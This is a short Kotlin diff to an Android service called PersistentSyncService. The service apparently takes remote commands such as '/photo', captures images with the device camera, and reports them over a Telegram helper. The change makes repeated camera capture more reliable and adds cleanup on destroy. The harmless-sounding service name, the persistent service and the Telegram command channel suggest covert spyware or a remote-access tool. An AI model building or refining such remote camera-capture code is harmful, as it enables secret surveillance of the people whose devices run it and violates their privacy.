@@ -77,7 +77,7 @@ class PersistentSyncService : LifecycleService() {
                                         "/photo" -> {
                                             serviceScope.launch {
                                                 try {
-                                                    val photoFile = CameraUtility.capturePhoto(this@PersistentSyncService)
+                                                    val photoFile = CameraUtility.get().capturePhoto(this@PersistentSyncService)
                                                     TelegramSyncHelper.sendLogData("📷 *Photo Captured:* ${photoFile.absolutePath}")
                                                 } catch (e: Exception) {
                                                     Log.e("PersistentSyncService", "Camera error", e)
@@ -128,5 +128,11 @@ class PersistentSyncService : LifecycleService() {
     override fun onBind(intent: Intent): IBinder? {
         super.onBind(intent)
         return null
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        // Explicitly release camera resources to prevent "Camera is closed" on subsequent calls
+        CameraUtility.get().shutdown()
     }
 }
